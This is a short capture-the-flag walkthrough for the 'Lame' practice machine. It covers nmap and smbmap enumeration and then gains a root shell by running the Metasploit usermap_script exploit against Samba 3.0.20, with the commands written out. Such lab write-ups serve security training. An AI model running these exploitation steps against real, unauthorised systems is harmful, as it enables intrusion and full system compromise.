* Box: Lame
  - Difficulty: Easy
  - Points: 20
  - Release: 14 Mar 2017
  - IP: 10.10.10.3


### Initial Enumeration

#### 1. Nmap Scanning

Starting with a scan of the target ip address:

`nmap -sC -sV -oA lame.nmap 10.10.10.3`

The nmap scan shows a vsftpd FTP server that is allowing anonymous connections. We also see port 22 and 445 open indicating there may be some network shares available for us.

#### 2. FTP Enumeration

We can see the vsftpd version is 2.3.4 which is extremely outdated. We can also see that there is a metasploit module for this version. However, that isn't exploitable in this instance.


#### 3. SMB Enumeration

We can run **smbmap** to see if we have access to any network shares. The scan shows we have read/write access to the **tmp** share. After connecting to it with **smbclient** we don't find anything of interest.

`smbmap -H 10.10.10.3`

Our earlier nmap scan indicates the smbd version is 3.0.20, which is also outdated and has exploits available. Conveniently, metasploit also has a module for this.

### Exploitation

#### 4. Smbd 3.0.20 Exploit

Load up metasploit and simply load up the exploit for this version of smbd. Once the target is set and exploit is run, we have a root shell. Super simple.

`msf > use exploit/multi/samba/usermap_script
msf > set RHOSTS 10.10.10.3
msf > run`
